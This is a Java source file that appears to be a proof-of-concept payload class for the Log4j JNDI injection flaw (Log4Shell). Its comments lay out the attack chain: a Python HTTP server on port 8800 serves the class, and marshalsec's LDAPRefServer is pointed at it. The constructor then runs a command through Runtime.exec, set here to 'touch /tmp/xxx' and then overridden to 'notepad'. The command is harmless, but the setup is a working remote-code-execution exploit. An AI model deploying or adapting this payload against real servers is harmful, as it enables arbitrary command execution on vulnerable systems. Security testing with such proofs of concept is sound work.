import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import javax.print.attribute.standard.PrinterMessageFromOperator;

// https://www.anquanke.com/post/id/262668
// https://github.com/mbechler/marshalsec
// python3 -m http.server 8800
// java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8800/#Log4JBugTest

public class Log4JBugTest {
    public Log4JBugTest() throws IOException, InterruptedException {
        String cmd = "touch /tmp/xxx";
        cmd = "notepad";
        final Process process = Runtime.getRuntime().exec(cmd);
        printMessage(process.getInputStream());
        printMessage(process.getErrorStream());
        int value = process.waitFor();
        System.out.println(value);
    }

    private static void printMessage(final InputStream input) {
        new Thread(() -> {
            Reader reader = new InputStreamReader(input);
            BufferedReader bf = new BufferedReader(reader);
            String line = null;
            try {
                while ((line = bf.readLine()) != null) {
                    System.out.println(line);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
}
